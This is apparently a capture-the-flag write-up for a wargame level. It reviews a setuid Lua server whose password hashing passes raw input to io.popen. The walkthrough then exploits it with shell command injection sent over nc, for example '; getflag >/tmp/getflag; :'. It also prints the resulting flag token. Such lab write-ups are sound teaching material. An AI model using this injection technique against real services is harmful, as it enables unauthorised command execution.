# level11

Target is `flag11`, let's do a bit of scouting:

```sh
ls -lA
```

Files:

```
-rwsr-sr-x 1 flag11  level11  668 Mar  5  2016 level11.lua
```

We have a single Lua script. Let's read it.

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

We have a socket listening on port TCP port 5151. It waits for an input then tries to hashes it with `sha1sum` and verifies the hash. We can try to see what the hash's input using a [rainbow table](https://en.wikipedia.org/wiki/Rainbow_table). A website like [CrackStation](https://crackstation.net/) can help us achieve this.

| Hash                                     | Type | Result    |
| ---------------------------------------- | ---- | --------- |
| f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 | sha1 | NotSoEasy |

So `sha1("NotSoEasy")` returns `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`. Let's try that as password for `flag11`:

```
flag11@localhost's password: NotSoEasy
Permission denied, please try again.
```

Probably wrong approach.

We can see that the server uses [`io.popen`](https://www.lua.org/manual/5.1/manual.html#pdf-io.popen) which is the Lua counterpart of C's [popen(3p)](https://man7.org/linux/man-pages/man3/popen.3p.html). It acts like [`system(3)`](https://man7.org/linux/man-pages/man3/system.3.html), but returns a pipe to the child process's standard input (if mode is `w`) or standard output (if mode is `r`).

Because it works like `system`, it does not handle quoting so it will be pretty easy to bypass the pipe and execute what we want.

We can try to start the server ourselves, but it appears it is already running:

```sh
./level11.lua
```

Output:

```
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
```

So we can try to exploit the _current running_ program. Let's do a simple `whoami` that redirects to a file:

```sh
echo '; whoami >/tmp/whoami; :' | nc localhost 5151 && cat /tmp/whoami
```

Output:

```
Password: Erf nope..
flag11
```

That's great. Now we simply need to replace `whoami` with `getflag` and we should be done.

```sh
echo '; getflag >/tmp/getflag; :' | nc localhost 5151 && cat /tmp/getflag
```

Output:

```
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Let's verify that is is correct.

```
level12@localhost's password: fa6v5ateaw21peobuub8ipe6s
```

OK.
